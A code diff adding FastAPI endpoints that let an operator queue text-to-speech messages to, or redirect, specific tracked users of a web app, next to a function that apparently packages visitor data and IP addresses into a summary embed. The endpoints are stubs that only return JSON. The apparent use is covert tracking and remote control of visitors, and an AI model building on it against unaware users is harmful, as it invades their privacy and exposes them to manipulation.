@@ -480,6 +480,47 @@ def create_summary_embed(user_id: str, data: dict, ip: str):
     return embed
 
 # ==================== FASTAPI ENDPOINTS ====================
+# Add these new endpoints to your FastAPI app
+
+class TTSCommand(BaseModel):
+    user_id: str
+    message: str
+
+class RedirectCommand(BaseModel):
+    user_id: str
+    url: str
+
+# Store active user connections (you'll need to track this from frontend)
+active_users = {}  # user_id -> websocket/session info
+
+@app.post("/api/tts")
+async def send_tts_command(command: TTSCommand):
+    """Send TTS message to specific user"""
+    if command.user_id in active_users:
+        # Queue TTS for delivery to that user's browser
+        return JSONResponse({
+            "status": "sent",
+            "message": f"TTS message queued for {command.user_id[:8]}",
+            "content": command.message
+        })
+    return JSONResponse({"error": "User not found"}, status_code=404)
+
+@app.post("/api/redirect")
+async def send_redirect_command(command: RedirectCommand):
+    """Redirect user to specified URL"""
+    if command.user_id in active_users:
+        return JSONResponse({
+            "status": "redirect_sent",
+            "url": command.url,
+            "message": f"Redirecting user {command.user_id[:8]} to {command.url}"
+        })
+    return JSONResponse({"error": "User not found"}, status_code=404)
+
+@app.get("/api/user/{user_id}/exists")
+async def user_exists(user_id: str):
+    """Check if user is active"""
+    return {"exists": user_id in active_users}
+
 @app.get("/")
 async def root():
     return {
